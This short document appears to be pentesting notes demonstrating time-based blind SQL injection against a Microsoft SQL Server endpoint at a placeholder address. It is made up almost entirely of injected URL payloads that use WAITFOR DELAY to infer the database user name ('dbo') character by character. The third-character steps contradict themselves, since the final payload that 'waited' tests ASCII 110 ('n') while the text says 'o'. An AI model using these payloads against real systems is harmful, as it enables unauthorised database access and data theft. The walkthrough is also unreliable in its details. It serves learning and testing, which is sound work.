
### Blind SQL Injection Testing #

### Now I am going to use Time-Based BLIND SQL INJECTION and EXTRACT DATABASE USER

```	 

http://x.x.x.x=2; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--
http://x.x.x.x=2; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--
http://x.x.x.x=2; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'-- 	 # the username is 3 chars long - it waited 10 seconds)
Let's go for a quick check to see if it's DBO
http://x.x.x.x=2;; IF ((USER)='dbo') WAITFOR DELAY '00:00:10'-- # it waited 10 seconds so we know the username is 'dbo'

http://x.x.x.x=2;; IF (ASCII(lower(substring((USER),1,1)))=97) WAITFOR DELAY '00:00:10'-- 	
http://x.x.x.x=2; IF (ASCII(lower(substring((USER),1,1)))=98) WAITFOR DELAY '00:00:10'--
http://x.x.x.x=2; IF (ASCII(lower(substring((USER),1,1)))=99) WAITFOR DELAY '00:00:10'--
http://x.x.x.x=2; IF (ASCII(lower(substring((USER),1,1)))=100) WAITFOR DELAY '00:00:10'-- 	#first letter is a 100 which is the letter 'd' - it waited 10 seconds)

B - 2nd Character
http://x.x.x.x=2; IF (ASCII(lower(substring((USER),2,1)))>97) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
http://x.x.x.x=2; IF (ASCII(lower(substring((USER),2,1)))=98) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
 
O - 3rd Character
http://x.x.x.x=2; IF (ASCII(lower(substring((USER),3,1)))>97) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
http://x.x.x.x=2; IF (ASCII(lower(substring((USER),3,1)))>115) WAITFOR DELAY '00:00:10'--
http://x.x.x.x=2; IF (ASCII(lower(substring((USER),3,1)))>105) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
http://x.x.x.x=2; IF (ASCII(lower(substring((USER),3,1)))>110) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
http://x.x.x.x=2; IF (ASCII(lower(substring((USER),3,1)))=109) WAITFOR DELAY '00:00:10'--
http://x.x.x.x=2; IF (ASCII(lower(substring((USER),3,1)))=110) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds

```

